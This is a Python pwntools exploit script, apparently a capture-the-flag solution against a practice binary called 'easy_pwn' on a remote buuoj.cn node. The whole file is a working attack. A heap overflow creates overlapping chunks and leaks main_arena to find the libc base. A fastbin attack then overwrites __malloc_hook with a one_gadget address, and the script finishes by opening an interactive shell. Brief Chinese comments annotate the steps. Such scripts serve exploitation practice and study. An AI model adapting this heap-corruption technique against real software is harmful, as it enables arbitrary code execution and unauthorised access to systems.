#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
# context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
if debug == 1:
    p = process('./easy_pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('node3.buuoj.cn', 29826)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./', checksec=False)


def create(create_size):
    p.sendlineafter('choice: ', '1')
    p.sendlineafter('size: ', str(create_size))


def write(write_idx, write_size, write_content):
    p.sendlineafter('choice: ', '2')
    p.sendlineafter('index: ', str(write_idx))
    p.sendlineafter('size: ', str(write_size))
    p.sendafter('content: ', write_content)


def drop(drop_idx):
    p.sendlineafter('choice: ', '3')
    p.sendlineafter('index: ', str(drop_idx))


def show(show_idx):
    p.sendlineafter('choice: ', '4')
    p.sendlineafter('index: ', str(show_idx))
    p.recvuntil('content: ')


create(0x68)  # 0
create(0x68)  # 1
create(0x68)  # 2
create(0x68)  # 3
create(0x28)  # 4
create(0x68)  # 5
create(0x48)  # 6
create(0x48)  # 7
write(7, 0x10, p64(0xdeadbeef) * 2)
write(0, 0x68 + 10, 'a' * 0x60 + p64(0) + '\xe1')  # [扩大chunk1的size，使其free时free掉chunk2]
drop(1)       # [free掉chunk1和chunk2]
create(0x68)  # 1[恢复chunk1]
show(2)       # [leak main_arena]

addr_main_arena = u64(p.recv(6).ljust(8, '\x00')) - 88
libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
libcbase = addr_main_arena - libc.sym['__malloc_hook'] - 0x10
addr___malloc_hook = libcbase + libc.sym['__malloc_hook']
addr_relloc = libcbase + libc.sym['__libc_realloc']
addr_one_gadget = libcbase + libc_one_gadget[1]

create(0x68)  # 8[恢复chunk2]
write(4, 0x10, p64(0xfafaadad) * 2)
write(3, 0x68 + 10, 'A' * 0x60 + p64(0) + '\xa1')
write(5, 0x68 + 10, 'B' * 0x60 + p64(0x71) + '\x51')
drop(5)  # make 0x70 fastbin
drop(4)  # make 0x90 fastbin
create(0x88)  # 4
write(4, 0x38, 'Z' * 0x20 + p64(0) + p64(0x71) + p64(addr___malloc_hook - 0x23))
create(0x68)  # 5
create(0x60)  # 9
write(9, 0x1b, '\x00' * 0x0b + p64(addr_one_gadget) + p64(addr_relloc))
# gdb.attach(p)
create(1)
success('addr_main_arena    = ' + hex(addr_main_arena))
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
success('addr_relloc        = ' + hex(addr_relloc))
success('addr_one_gadget    = ' + hex(addr_one_gadget))
p.interactive()
